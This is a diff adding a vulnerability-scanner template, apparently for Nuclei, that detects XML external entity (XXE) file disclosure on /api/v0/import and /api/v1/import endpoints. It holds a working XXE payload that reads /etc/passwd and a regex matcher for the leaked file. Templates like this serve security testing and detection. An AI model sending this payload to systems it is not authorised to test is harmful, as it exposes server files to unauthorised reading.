@@ -1,0 +1,19 @@
+id: xxe-external-entity-file-read
+info:
+  name: XML external entity (XXE) local file disclosure
+  severity: critical
+  description: The XML parser resolves external SYSTEM entities, so a crafted DOCTYPE reads a local file (/etc/passwd) and reflects its contents in the response.
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v0/import"
+      - "{{BaseURL}}/api/v1/import"
+    headers:
+      Content-Type: application/xml
+    body: "<?xml version=\"1.0\"?><!DOCTYPE r [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><r>&xxe;</r>"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
